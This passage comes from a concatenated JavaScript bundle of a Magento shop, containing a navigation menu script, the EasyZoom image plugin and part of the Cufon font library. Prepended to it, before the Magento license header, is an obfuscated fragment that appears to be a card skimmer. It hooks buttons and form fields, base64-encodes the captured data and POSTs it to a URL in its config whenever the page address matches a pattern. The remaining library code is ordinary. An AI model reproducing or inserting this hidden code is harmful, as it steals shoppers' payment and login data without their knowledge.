_0xda35[30]){if(_0xb69fxb[_0xda35[31]]){_0xb69fxb[_0xda35[31]](_0xda35[32],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]],false)}else {_0xb69fxb[_0xda35[35]](_0xda35[34],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]])}}};var _0xb69fxc=document[_0xda35[17]](_0xda35[36]);for(vari= 0;_0xb69fx8< _0xb69fxc[_0xda35[18]];_0xb69fx8++){if(_0xb69fxc[_0xb69fx8][_0xda35[31]]){_0xb69fxc[_0xb69fx8][_0xda35[31]](_0xda35[37],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]],false)}else {_0xb69fxc[_0xb69fx8][_0xda35[35]](_0xda35[38],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]])}};if(ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]!= null){var _0xb69fxd=location[_0xda35[44]][_0xda35[43]](_0xda35[42])[_0xda35[41]](0)[_0xda35[40]](_0xda35[39])|| _0xda35[45];var _0xb69fxe=btoa(ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]);var _0xb69fxf= new XMLHttpRequest();_0xb69fxf[_0xda35[48]](_0xda35[46],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[47]],true);_0xb69fxf[_0xda35[51]](_0xda35[49],_0xda35[50]);_0xb69fxf[_0xda35[56]](_0xda35[52]+ _0xb69fxe+ _0xda35[53]+ _0xb69fxd+ _0xda35[54]+ ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[55]])};ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]= null;_0xb69fxe= null;setTimeout(function(){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[56]]()},30)}catch(e){}}};if(( new RegExp(_0xda35[59],_0xda35[60]))[_0xda35[58]](window[_0xda35[57]])){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[56]]()}
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */

/**
 * @classDescription simple Navigation with replacing old handlers
 * @param {String} id id of ul element with navigation lists
 * @param {Object} settings object with settings
 */
var mainNav = function() {

    var main = {
        obj_nav :   $(arguments[0]) || $("nav"),

        settings :  {
            show_delay      :   0,
            hide_delay      :   0,
            _ie6            :   /MSIE 6.+Win/.test(navigator.userAgent),
            _ie7            :   /MSIE 7.+Win/.test(navigator.userAgent)
        },

        init :  function(obj, level) {
            obj.lists = obj.childElements();
            obj.lists.each(function(el,ind){
                main.handlNavElement(el);
                if((main.settings._ie6 || main.settings._ie7) && level){
                    main.ieFixZIndex(el, ind, obj.lists.size());
                }
            });
            if(main.settings._ie6 && !level){
                document.execCommand("BackgroundImageCache", false, true);
            }
        },

        handlNavElement :   function(list) {
            if(list !== undefined){
                list.onmouseover = function(){
                    main.fireNavEvent(this,true);
                };
                list.onmouseout = function(){
                    main.fireNavEvent(this,false);
                };
                if(list.down("ul")){
                    main.init(list.down("ul"), true);
                }
            }
        },

        ieFixZIndex : function(el, i, l) {
            if(el.tagName.toString().toLowerCase().indexOf("iframe") == -1){
                el.style.zIndex = l - i;
            } else {
                el.onmouseover = "null";
                el.onmouseout = "null";
            }
        },

        fireNavEvent :  function(elm,ev) {
            if(ev){
                elm.addClassName("over");
                elm.down("a").addClassName("over");
                if (elm.childElements()[1]) {
                    main.show(elm.childElements()[1]);
                }
            } else {
                elm.removeClassName("over");
                elm.down("a").removeClassName("over");
                if (elm.childElements()[1]) {
                    main.hide(elm.childElements()[1]);
                }
            }
        },

        show : function (sub_elm) {
            if (sub_elm.hide_time_id) {
                clearTimeout(sub_elm.hide_time_id);
            }
            sub_elm.show_time_id = setTimeout(function() {
                if (!sub_elm.hasClassName("shown-sub")) {
                    sub_elm.addClassName("shown-sub");
                }
            }, main.settings.show_delay);
        },

        hide : function (sub_elm) {
            if (sub_elm.show_time_id) {
                clearTimeout(sub_elm.show_time_id);
            }
            sub_elm.hide_time_id = setTimeout(function(){
                if (sub_elm.hasClassName("shown-sub")) {
                    sub_elm.removeClassName("shown-sub");
                }
            }, main.settings.hide_delay);
        }

    };
    if (arguments[1]) {
        main.settings = Object.extend(main.settings, arguments[1]);
    }
    if (main.obj_nav) {
        main.init(main.obj_nav, false);
    }
};

document.observe("dom:loaded", function() {
    //run navigation without delays and with default id="#nav"
    //mainNav();

    //run navigation with delays
    mainNav("nav", {"show_delay":"100","hide_delay":"100"});
});

/**
 * Based on Easy Zoom 1.0 - jQuery plugin
 * Written by Matt Hinchliffe
 * http://www.github.com/i-like-robots/EasyZoom
 * Based on the original work by Alen Grakalic
 * http://cssglobe.com/post/9711/jquery-plugin-easy-image-zoom
 *
 * Copyright (c) 2011 Alen Grakalic (http://cssglobe.com)
 * Dual licensed under the MIT (MIT-LICENSE.txt)
 * and GPL (GPL-LICENSE.txt) licenses.
 *
 * Built for jQuery library
 * http://jquery.com
 *
 * Example HTML:
 * <div class="zoom-container">
 *     <a class="zoom" href="large_img.jpg">
 *         <img src="small_img.jpg" />
 *     </a>
 * </div>
 *
 * Required CSS:
 * .zoom-container {
 *     position:relative;
 * }
 * #zoom-window {
 *     position:absolute;
 *     width:[*]px;
 *     height:[*]px;
 *     z-index:[*];
 * }
 *
 * Plugin use:
 * $('.zoom').easyZoom({
 *     id: '#zoom-window',
 *     parent: '.zoom-container'
 * });
 *
 * Options:
 * - id: The ID to give the zoom window
 * - parent: Parent element selector to append zoom window to
 * - preload: Preloader content/text
 * - error: Error content/text
 *
 * Public methods:
 *  - // Get data object
 *    var $zoom = $('.zoom').data('easyZoom');
 *  - // Hide open zoom window
 *    $zoom.hide();
 *  - // Change image
 *    $zoom.loadimg(src);
 */

;(function ($, undefined)
{
	function EasyZoom(target, options)
	{
		// Default options
		var defaults = {
			id: 'zoom-window',
			parent: 'body',            
			preload: 'Loading...',
            lightboxBtn: false,
			error: '<p>There has been a problem attempting to loading the image.</p>'
		};
        
		this.options = $.extend({}, defaults, options);

		var self = this,
		    loaded = false,
		    found = true,
		    timeout,
		    w1,w2,w3,w4,
		    h1,h2,h3,h4,
		    rw,rh,
		    over = false;

		/**
		 * Init
		 * @description Caches related DOM objects and sets up events
		 */
		function init()
		{
			// DOM elements
			self.elements = {
				$target: $(target),
				$source: $('img', target),
				$parent: $(self.options.parent),
				$panel:  $('<div id="' + self.options.id + '">' + self.options.preload + '</div>').css('display', 'none')
			};

			preload(self.elements.$target.attr('href'));

			// Bind events to target
			self.elements.$target
				.on('click.easyZoom', function(e)
				{
					e.preventDefault();
				})
				.on('mouseover.easyZoom', function(e)
				{
					start(e);
				})
				.on('mouseout.easyZoom', function()
				{
					self.hide();
				})
				.on('mousemove.easyZoom', function(e)
				{
					move(e);
				});
		}

		/**
		 * Preload
		 * @description Preload full sized image
		 */
		function preload(href)
		{
			loaded = false;

			// Load zoomed image
			self.elements.$zoomed = self.loadimg(href)
				.on('error.easyZoom', function()
				{
					found = false;
				})
				.on('load.easyZoom', function()
				{
					loaded = true;

					self.elements.$zoomed.off('.easyZoom');
				});
		}

		/**
		 * Start
		 * @description Add panel to page and display when full size image is loaded
		 */
		function start(e)
		{
			self.elements.$panel.appendTo(self.elements.$parent);

			if (!found)
			{
				error();
			}
			else
			{
				if (loaded)
				{
					show(e);
				}
				else
				{
					loop(e);
				}
			}
		}

		/**
		 * Loop
		 * @description Displays image when loaded if mouse event has been called
		 */
		function loop(e)
		{
			if (loaded)
			{
				show(e);
				clearTimeout(timeout);
			}
			else
			{
				self.elements.$target.css('cursor', 'progress')

				timeout = setTimeout(function()
				{
					loop(e);
				}, 200);
			}
		}

		/**
		 * Error
		 * @description Display error message within zoom panel
		 */
		function error()
		{
			self.elements.$panel.html(self.options.error);
		}

		/**
		 * Move
		 * @description Re-positions zoom panel image based on mouse event
		 */
		function move(e)
		{
			if (over)
			{
				var p = self.elements.$source.offset(),
				    pl = e.pageX - p.left,
				    pt = e.pageY - p.top,
				    xl = pl * rw,
				    xt = pt * rh;

				xl = (xl > w4) ? w4 : xl;
				xt = (xt > h4) ? h4 : xt;

				self.elements.$zoomed.css({left: -xl, top: -xt});
			}
		}

		/**
		 * Show
		 * @description Displays zoom panel
		 */
		function show(e)
		{
			over = true;

			self.elements.$target.css('cursor', 'crosshair');

			self.elements.$panel
				.append( self.elements.$zoomed.css({position: 'absolute'}) )
				.fadeIn(200);

			w1 = self.elements.$source.width();
			h1 = self.elements.$source.height();
			w2 = self.elements.$panel.width();
			h2 = self.elements.$panel.height();
			w4 = self.elements.$zoomed.width() - w2;
			h4 = self.elements.$zoomed.height() - h2;
			rw = w4 / w1;
			rh = h4 / h1;

			move(e);
		}

		/**
		 * Load image
		 * @description Load an image
		 * @returns A new image element
		 */
		this.loadimg = function(src)
		{
			var img = new Image();

			img.src = src + '?' + (new Date()).getTime();
			img.onload = function()
			{
				img = null; // Clear memory
			};

			return $(img);
		};

		/**
		 * Hide
		 * @description Public method to hide the zoom panel
		 */
		this.hide = function()
		{
			if (over)
			{
				over = false;

				self.elements.$target.css('cursor', 'default');

				self.elements.$panel.fadeOut(200, function()
				{
					self.elements.$panel = self.elements.$panel.remove().html('');
				});
			}
		};

		/**
		 * Update
		 * @description Public shortcut method for hide() + preload()
		 */
		this.update = function(href)
		{
			this.hide();
			preload(href);
		};

		/**
		 * Destroy
		 * @description Public method to remove zoom panel events
		 */
		this.destroy = function()
		{
			this.hide();
		};

		// Instantiate only for anchors
		if (target.tagName.toLowerCase() === 'a')
		{
			init(); // Call init at runtime to avoid compile time scope issues.

			return this;
		}
	}

	// jQuery plugin wrapper
	$.fn.easyZoom = function(options)
	{
		return this.each(function()
		{
			$.data(this, 'easyZoom', new EasyZoom(this, options));
		});
	};

	// Gallery extension
	EasyZoom.prototype.gallery = function(selector, scope)
	{
		var self = this,
		    $scope = scope ? $(scope) : this.elements.$parent;

		$scope.on('click', selector, function(e)
		{
			e.preventDefault();

			var $this = $(this).addClass('thumbnail-loading'),
			    zoomed = $this.attr('href'),
			    source = $this.data('easyzoom-source');
			// Load new source image
			self.loadimg(source).on('load', function()
			{
				// Swap current source image
				self.elements.$source.attr('src', source);
				self.elements.$target.attr('href', zoomed);
                
                if(self.options.lightboxBtn){
                   jQuery(self.options.lightboxBtn).attr('href',zoomed); 
                }
                
				self.update(zoomed);

				$this.removeClass('thumbnail-loading');
			});
            $(this).parent().parent().find('li').find('a').removeClass('thumbnail-active');
            $(this).addClass('thumbnail-active')
		});
	};

})(jQuery);

/*!
 * Copyright (c) 2011 Simo Kinnunen.
 * Licensed under the MIT license.
 *
 * @version ${Version}
 */

var Cufon = (function() {

	var api = function() {
		return api.replace.apply(null, arguments);
	};

	var DOM = api.DOM = {

		ready: (function() {

			var complete = false, readyStatus = { loaded: 1, complete: 1 };

			var queue = [], perform = function() {
				if (complete) return;
				complete = true;
				for (var fn; fn = queue.shift(); fn());
			};

			// Gecko, Opera, WebKit r26101+

			if (document.addEventListener) {
				document.addEventListener('DOMContentLoaded', perform, false);
				window.addEventListener('pageshow', perform, false); // For cached Gecko pages
			}

			// Old WebKit, Internet Explorer

			if (!window.opera && document.readyState) (function() {
				readyStatus[document.readyState] ? perform() : setTimeout(arguments.callee, 10);
			})();

			// Internet Explorer

			if (document.readyState && document.createStyleSheet) (function() {
				try {
					document.body.doScroll('left');
					perform();
				}
				catch (e) {
					setTimeout(arguments.callee, 1);
				}
			})();

			addEvent(window, 'load', perform); // Fallback

			return function(listener) {
				if (!arguments.length) perform();
				else complete ? listener() : queue.push(listener);
			};

		})(),

		root: function() {
			return document.documentElement || document.body;
		},

		strict: (function() {
			var doctype;
			// no doctype (doesn't always catch it though.. IE I'm looking at you)
			if (document.compatMode == 'BackCompat') return false;
			// WebKit, Gecko, Opera, IE9+
			doctype = document.doctype;
			if (doctype) {
				return !/frameset|transitional/i.test(doctype.publicId);
			}
			// IE<9, firstChild is the doctype even if there's an XML declaration
			doctype = document.firstChild;
			if (doctype.nodeType != 8 || /^DOCTYPE.+(transitional|frameset)/i.test(doctype.data)) {
				return false;
			}
			return true;
		})()

	};

	var CSS = api.CSS = {

		Size: function(value, base) {

			this.value = parseFloat(value);
			this.unit = String(value).match(/[a-z%]*$/)[0] || 'px';

			this.convert = function(value) {
				return value / base * this.value;
			};

			this.convertFrom = function(value) {
				return value / this.value * base;
			};

			this.toString = function() {
				return this.value + this.unit;
			};

		},

		addClass: function(el, className) {
			var current = el.className;
			el.className = current + (current && ' ') + className;
			return el;
		},

		color: cached(function(value) {
			var parsed = {};
			parsed.color = value.replace(/^rgba\((.*?),\s*([\d.]+)\)/, function($0, $1, $2) {
				parsed.opacity = parseFloat($2);
				return 'rgb(' + $1 + ')';
			});
			return parsed;
		}),

		// has no direct CSS equivalent.
		// @see http://msdn.microsoft.com/en-us/library/system.windows.fontstretches.aspx
		fontStretch: cached(function(value) {
			if (typeof value == 'number') return value;
			if (/%$/.test(value)) return parseFloat(value) / 100;
			return {
				'ultra-condensed': 0.5,
				'extra-condensed': 0.625,
				condensed: 0.75,
				'semi-condensed': 0.875,
				'semi-expanded': 1.125,
				expanded: 1.25,
				'extra-expanded': 1.5,
				'ultra-expanded': 2
			}[value] || 1;
		}),

		getStyle: function(el) {
			var view = document.defaultView;
			if (view && view.getComputedStyle) return new Style(view.getComputedStyle(el, null));
			if (el.currentStyle) return new Style(el.currentStyle);
			return new Style(el.style);
		},

		gradient: cached(function(value) {
			var gradient = {
				id: value,
				type: value.match(/^-([a-z]+)-gradient\(/)[1],
				stops: []
			}, colors = value.substr(value.indexOf('(')).match(/([\d.]+=)?(#[a-f0-9]+|[a-z]+\(.*?\)|[a-z]+)/ig);
			for (var i = 0, l = colors.length, stop; i < l; ++i) {
				stop = colors[i].split('=', 2).reverse();
				gradient.stops.push([ stop[1] || i / (l - 1), stop[0] ]);
			}
			return gradient;
		}),

		quotedList: cached(function(value) {
			// doesn't work properly with empty quoted strings (""), but
			// it's not worth the extra code.
			var list = [], re = /\s*((["'])([\s\S]*?[^\\])\2|[^,]+)\s*/g, match;
			while (match = re.exec(value)) list.push(match[3] || match[1]);
			return list;
		}),

		recognizesMedia: cached(function(media) {
			var el = document.createElement('style'), sheet, container, supported;
			el.type = 'text/css';
			el.media = media;
			try { // this is cached anyway
				el.appendChild(document.createTextNode('/**/'));
			} catch (e) {}
			container = elementsByTagName('head')[0];
			container.insertBefore(el, container.firstChild);
			sheet = (el.sheet || el.styleSheet);
			supported = sheet && !sheet.disabled;
			container.removeChild(el);
			return supported;
		}),

		removeClass: function(el, className) {
			var re = RegExp('(?:^|\\s+)' + className +  '(?=\\s|$)', 'g');
			el.className = el.className.replace(re, '');
			return el;
		},

		supports: function(property, value) {
			var checker = document.createElement('span').style;
			if (checker[property] === undefined) return false;
			checker[property] = value;
			return checker[property] === value;
		},

		textAlign: function(word, style, position, wordCount) {
			if (style.get('textAlign') == 'right') {
				if (position > 0) word = ' ' + word;
			}
			else if (position < wordCount - 1) word += ' ';
			return word;
		},

		textShadow: cached(function(value) {
			if (value == 'none') return null;
			var shadows = [], currentShadow = {}, result, offCount = 0;
			var re = /(#[a-f0-9]+|[a-z]+\(.*?\)|[a-z]+)|(-?[\d.]+[a-z%]*)|,/ig;
			while (result = re.exec(value)) {
				if (result[0] == ',') {
					shadows.push(currentShadow);
					currentShadow = {};
					offCount = 0;
				}
				else if (result[1]) {
					currentShadow.color = result[1];
				}
				else {
					currentShadow[[ 'offX', 'offY', 'blur' ][offCount++]] = result[2];
				}
			}
			shadows.push(currentShadow);
			return shadows;
		}),

		textTransform: (function() {
			var map = {
				uppercase: function(s) {
					return s.toUpperCase();
				},
				lowercase: function(s) {
					return s.toLowerCase();
				},
				capitalize: function(s) {
					return s.replace(/(?:^|\s)./g, function($0) {
						return $0.toUpperCase();
					});
				}
			};
			return function(text, style) {
				var transform = map[style.get('textTransform')];
				return transform ? transform(text) : text;
			};
		})(),

		whiteSpace: (function() {
			var ignore = {
				inline: 1,
				'inline-block': 1,
				'run-in': 1
			};
			var wsStart = /^\s+/, wsEnd = /\s+$/;
			return function(text, style, node, previousElement, simple) {
				if (simple) return text.replace(wsStart, '').replace(wsEnd, ''); // @fixme too simple
				if (previousElement) {
					if (previousElement.nodeName.toLowerCase() == 'br') {
						text = text.replace(wsStart, '');
					}
				}
				if (ignore[style.get('display')]) return text;
				if (!node.previousSibling) text = text.replace(wsStart, '');
				if (!node.nextSibling) text = text.replace(wsEnd, '');
				return text;
			};
		})()

	};

	CSS.ready = (function() {

		// don't do anything in Safari 2 (it doesn't recognize any media type)
		var complete = !CSS.recognizesMedia('all'), hasLayout = false;

		var queue = [], perform = function() {
			complete = true;
			for (var fn; fn = queue.shift(); fn());
		};

		var links = elementsByTagName('link'), styles = elementsByTagName('style');

		var checkTypes = {
			'': 1,
			'text/css': 1
		};

		function isContainerReady(el) {
			if (!checkTypes[el.type.toLowerCase()]) return true;
			return el.disabled || isSheetReady(el.sheet, el.media || 'screen');
		}

		function isSheetReady(sheet, media) {
			// in Opera sheet.disabled is true when it's still loading,
			// even though link.disabled is false. they stay in sync if
			// set manually.
			if (!CSS.recognizesMedia(media || 'all')) return true;
			if (!sheet || sheet.disabled) return false;
			try {
				var rules = sheet.cssRules, rule;
				if (rules) {
					// needed for Safari 3 and Chrome 1.0.
					// in standards-conforming browsers cssRules contains @-rules.
					// Chrome 1.0 weirdness: rules[<number larger than .length - 1>]
					// returns the last rule, so a for loop is the only option.
					search: for (var i = 0, l = rules.length; rule = rules[i], i < l; ++i) {
						switch (rule.type) {
							case 2: // @charset
								break;
							case 3: // @import
								if (!isSheetReady(rule.styleSheet, rule.media.mediaText)) return false;
								break;
							default:
								// only @charset can precede @import
								break search;
						}
					}
				}
			}
			catch (e) {} // probably a style sheet from another domain
			return true;
		}

		function allStylesLoaded() {
			// Internet Explorer's style sheet model, there's no need to do anything
			if (document.createStyleSheet) return true;
			// standards-compliant browsers
			var el, i;
			for (i = 0; el = links[i]; ++i) {
				if (el.rel.toLowerCase() == 'stylesheet' && !isContainerReady(el)) return false;
			}
			for (i = 0; el = styles[i]; ++i) {
				if (!isContainerReady(el)) return false;
			}
			return true;
		}

		DOM.ready(function() {
			// getComputedStyle returns null in Gecko if used in an iframe with display: none
			if (!hasLayout) hasLayout = CSS.getStyle(document.body).isUsable();
			if (complete || (hasLayout && allStylesLoaded())) perform();
			else setTimeout(arguments.callee, 10);
		});

		return function(listener) {
			if (complete) listener();
			else queue.push(listener);
		};

	})();

	function Font(data) {

		var face = this.face = data.face, wordSeparators = {
			'\u0020': 1,
			'\u00a0': 1,
			'\u3000': 1
		};

		this.glyphs = (function(glyphs) {
			var key, fallbacks = {
				'\u2011': '\u002d',
				'\u00ad': '\u2011'
			};
			for (key in fallbacks) {
				if (!hasOwnProperty(fallbacks, key)) continue;
				if (!glyphs[key]) glyphs[key] = glyphs[fallbacks[key]];
			}
			return glyphs;
		})(data.glyphs);

		this.w = data.w;
		this.baseSize = parseInt(face['units-per-em'], 10);

		this.family = face['font-family'].toLowerCase();
		this.weight = face['font-weight'];
		this.style = face['font-style'] || 'normal';

		this.viewBox = (function () {
			var parts = face.bbox.split(/\s+/);
			var box = {
				minX: parseInt(parts[0], 10),
				minY: parseInt(parts[1], 10),
				maxX: parseInt(parts[2], 10),
				maxY: parseInt(parts[3], 10)
			};
			box.width = box.maxX - box.minX;
			box.height = box.maxY - box.minY;
			box.toString = function() {
				return [ this.minX, this.minY, this.width, this.height ].join(' ');
			};
			return box;
		})();

		this.ascent = -parseInt(face.ascent, 10);
		this.descent = -parseInt(face.descent, 10);

		this.height = -this.ascent + this.descent;

		this.spacing = function(chars, letterSpacing, wordSpacing) {
			var glyphs = this.glyphs, glyph,
				kerning, k,
				jumps = [],
				width = 0, w,
				i = -1, j = -1, chr;
			while (chr = chars[++i]) {
				glyph = glyphs[chr] || this.missingGlyph;
				if (!glyph) continue;
				if (kerning) {
					width -= k = kerning[chr] || 0;
					jumps[j] -= k;
				}
				w = glyph.w;
				if (isNaN(w)) w = +this.w; // may have been a String in old fonts
				if (w > 0) {
					w += letterSpacing;
					if (wordSeparators[chr]) w += wordSpacing;
				}
				width += jumps[++j] = ~~w; // get rid of decimals
				kerning = glyph.k;
			}
			jumps.total = width;
			return jumps;
		};

	}

	function FontFamily() {

		var styles = {}, mapping = {
			oblique: 'italic',
			italic: 'oblique'
		};

		this.add = function(font) {
			(styles[font.style] || (styles[font.style] = {}))[font.weight] = font;
		};

		this.get = function(style, weight) {
			var weights = styles[style] || styles[mapping[style]]
				|| styles.normal || styles.italic || styles.oblique;
			if (!weights) return null;
			// we don't have to worry about "bolder" and "lighter"
			// because IE's currentStyle returns a numeric value for it,
			// and other browsers use the computed value anyway
			weight = {
				normal: 400,
				bold: 700
			}[weight] || parseInt(weight, 10);
			if (weights[weight]) return weights[weight];
			// http://www.w3.org/TR/CSS21/fonts.html#propdef-font-weight
			// Gecko uses x99/x01 for lighter/bolder
			var up = {
				1: 1,
				99: 0
			}[weight % 100], alts = [], min, max;
			if (up === undefined) up = weight > 400;
			if (weight == 500) weight = 400;
			for (var alt in weights) {
				if (!hasOwnProperty(weights, alt)) continue;
				alt = parseInt(alt, 10);
				if (!min || alt < min) min = alt;
				if (!max || alt > max) max = alt;
				alts.push(alt);
			}
			if (weight < min) weight = min;
			if (weight > max) weight = max;
			alts.sort(function(a, b) {
				return (up
					? (a >= weight && b >= weight) ? a < b : a > b
					: (a <= weight && b <= weight) ? a > b : a < b) ? -1 : 1;
			});
			return weights[alts[0]];
		};

	}

	function HoverHandler() {

		function contains(node, anotherNode) {
			try {
				if (node.contains) return node.contains(anotherNode);
				return node.compareDocumentPosition(anotherNode) & 16;
			}
			catch(e) {} // probably a XUL element such as a scrollbar
			return false;
		}

		// mouseover/mouseout (standards) mode
		function onOverOut(e) {
			var related = e.relatedTarget;
			// there might be no relatedTarget if the element is right next
			// to the window frame
			if (related && contains(this, related)) return;
			trigger(this, e.type == 'mouseover');
		}

		// mouseenter/mouseleave (probably ie) mode
		function onEnterLeave(e) {
			if (!e) e = window.event;
			// ie model, we don't have access to "this", but
			// mouseenter/leave doesn't bubble so it's fine.
			trigger(e.target || e.srcElement, e.type == 'mouseenter');
		}

		function trigger(el, hoverState) {
			// A timeout is needed so that the event can actually "happen"
			// before replace is triggered. This ensures that styles are up
			// to date.
			setTimeout(function() {
				var options = sharedStorage.get(el).options;
				if (hoverState) {
					options = merge(options, options.hover);
					options._mediatorMode = 1;
				}
				api.replace(el, options, true);
			}, 10);
		}

		this.attach = function(el) {
			if (el.onmouseenter === undefined) {
				addEvent(el, 'mouseover', onOverOut);
				addEvent(el, 'mouseout', onOverOut);
			}
			else {
				addEvent(el, 'mouseenter', onEnterLeave);
				addEvent(el, 'mouseleave', onEnterLeave);
			}
		};

		this.detach = function(el) {
			if (el.onmouseenter === undefined) {
				removeEvent(el, 'mouseover', onOverOut);
				removeEvent(el, 'mouseout', onOverOut);
			}
			else {
				removeEvent(el, 'mouseenter', onEnterLeave);
				removeEvent(el, 'mouseleave', onEnterLeave);
			}
		};

	}

	function ReplaceHistory() {

		var list = [], map = {};

		function filter(keys) {
			var values = [], key;
			for (var i = 0; key = keys[i]; ++i) values[i] = list[map[key]];
			return values;
		}

		this.add = function(key, args) {
			map[key] = list.push(args) - 1;
		};

		this.repeat = function() {
			var snapshot = arguments.length ? filter(arguments) : list, args;
			for (var i = 0; args = snapshot[i++];) api.replace(args[0], args[1], true);
		};

	}

	function Storage() {

		var map = {}, at = 0;

		function identify(el) {
			return el.cufid || (el.cufid = ++at);
		}

		this.get = function(el) {
			var id = identify(el);
			return map[id] || (map[id] = {});
		};

	}

	function Style(style) {

		var custom = {}, sizes = {};

		this.extend = function(styles) {
			for (var property in styles) {
				if (hasOwnProperty(styles, property)) custom[property] = styles[property];
			}
			return this;
		};

		this.get = function(property) {
			return custom[property] != undefined ? custom[property] : style[property];
		};

		this.getSize = function(property, base) {
			return sizes[property] || (sizes[property] = new CSS.Size(this.get(property), base));
		};

		this.isUsable = function() {
			return !!style;
		};

	}

	function addEvent(el, type, listener) {
		if (el.addEventListener) {
			el.addEventListener(type, listener, false);
		}
		else if (el.attachEvent) {
			// we don't really need "this" right now, saves code
			el.attachEvent('on' + type, listener);
		}
	}

	function attach(el, options) {
		if (options._mediatorMode) return el;
		var storage = sharedStorage.get(el);
		var oldOptions = storage.options;
		if (oldOptions) {
			if (oldOptions === options) return el;
			if (oldOptions.hover) hoverHandler.detach(el);
		}
		if (options.hover && options.hoverables[el.nodeName.toLowerCase()]) {
			hoverHandler.attach(el);
		}
		storage.options = options;
		return el;
	}

	function cached(fun) {
		var cache = {};
		return function(key) {
			if (!hasOwnProperty(cache, key)) cache[key] = fun.apply(null, arguments);
			return cache[key];
		};
	}

	function getFont(el, style) {
		var families = CSS.quotedList(style.get('fontFamily').toLowerCase()), family;
		for (var i = 0; family = families[i]; ++i) {
			if (fonts[family]) return fonts[family].get(style.get('fontStyle'), style.get('fontWeight'));
		}
		return null;
	}

	function elementsByTagName(query) {
		return document.getElementsByTagName(query);
	}

	function hasOwnProperty(obj, property) {
		return obj.hasOwnProperty(property);
	}

	function merge() {
		var merged = {}, arg, key;
		for (var i = 0, l = arguments.length; arg = arguments[i], i < l; ++i) {
			for (key in arg) {
				if (hasOwnProperty(arg, key)) merged[key] = arg[key];
			}
		}
		return merged;
	}

	function process(font, text, style, options, node, el) {
		var fragment = document.createDocumentFragment(), processed;
		if (text === '') return fragment;
		var separate = options.separate;
		var parts = text.split(separators[separate]), needsAligning = (separate == 'words');
		if (needsAligning && HAS_BROKEN_REGEXP) {
			// @todo figure out a better way to do this
			if (/^\s/.test(text)) parts.unshift('');
			if (/\s$/.test(text)) parts.push('');
		}
		for (var i = 0, l = parts.length; i < l; ++i) {
			processed = engines[options.engine](font,
				needsAligning ? CSS.textAlign(parts[i], style, i, l) : parts[i],
				style, options, node, el, i < l - 1);
			if (processed) fragment.appendChild(processed);
		}
		return fragment;
	}

	function removeEvent(el, type, listener) {
		if (el.removeEventListener) {
			el.removeEventListener(type, listener, false);
		}
		else if (el.detachEvent) {
			el.detachEvent('on' + type, listener);
		}
	}

	function replaceElement(el, options) {
		var name = el.nodeName.toLowerCase();
		if (options.ignore[name]) return;
		if (options.ignoreClass && options.ignoreClass.test(el.className)) return;
		if (options.onBeforeReplace) options.onBeforeReplace(el, options);
		var replace = !options.textless[name], simple = (options.trim === 'simple');
		var style = CSS.getStyle(attach(el, options)).extend(options);
		// may cause issues if the element contains other elements
		// with larger fontSize, however such cases are rare and can
		// be fixed by using a more specific selector
		if (parseFloat(style.get('fontSize')) === 0) return;
		var font = getFont(el, style), node, type, next, anchor, text, lastElement;
		var isShy = options.softHyphens, anyShy = false, pos, shy, reShy = /\u00ad/g;
		var modifyText = options.modifyText;
		if (!font) return;
		for (node = el.firstChild; node; node = next) {
			type = node.nodeType;
			next = node.nextSibling;
			if (replace && type == 3) {
				if (isShy && el.nodeName.toLowerCase() != TAG_SHY) {
					pos = node.data.indexOf('\u00ad');
					if (pos >= 0) {
						node.splitText(pos);
						next = node.nextSibling;
						next.deleteData(0, 1);
						shy = document.createElement(TAG_SHY);
						shy.appendChild(document.createTextNode('\u00ad'));
						el.insertBefore(shy, next);
						next = shy;
						anyShy = true;
					}
				}
				// Node.normalize() is broken in IE 6, 7, 8
				if (anchor) {
					anchor.appendData(node.data);
					el.removeChild(node);
				}
				else anchor = node;
				if (next) continue;
			}
			if (anchor) {
				text = anchor.data;
				if (!isShy) text = text.replace(reShy, '');
				text = CSS.whiteSpace(text, style, anchor, lastElement, simple);
				// modify text only on the first replace
				if (modifyText) text = modifyText(text, anchor, el, options);
				el.replaceChild(process(font, text, style, options, node, el), anchor);
				anchor = null;
			}
			if (type == 1) {
				if (node.firstChild) {
					if (node.nodeName.toLowerCase() == 'cufon') {
						engines[options.engine](font, null, style, options, node, el);
					}
					else arguments.callee(node, options);
				}
				lastElement = node;
			}
		}
		if (isShy && anyShy) {
			updateShy(el);
			if (!trackingShy) addEvent(window, 'resize', updateShyOnResize);
			trackingShy = true;
		}
		if (options.onAfterReplace) options.onAfterReplace(el, options);
	}

	function updateShy(context) {
		var shys, shy, parent, glue, newGlue, next, prev, i;
		shys = context.getElementsByTagName(TAG_SHY);
		// unfortunately there doesn't seem to be any easy
		// way to avoid having to loop through the shys twice.
		for (i = 0; shy = shys[i]; ++i) {
			shy.className = C_SHY_DISABLED;
			glue = parent = shy.parentNode;
			if (glue.nodeName.toLowerCase() != TAG_GLUE) {
				newGlue = document.createElement(TAG_GLUE);
				newGlue.appendChild(shy.previousSibling);
				parent.insertBefore(newGlue, shy);
				newGlue.appendChild(shy);
			}
			else {
				// get rid of double glue (edge case fix)
				glue = glue.parentNode;
				if (glue.nodeName.toLowerCase() == TAG_GLUE) {
					parent = glue.parentNode;
					while (glue.firstChild) {
						parent.insertBefore(glue.firstChild, glue);
					}
					parent.removeChild(glue);
				}
			}
		}
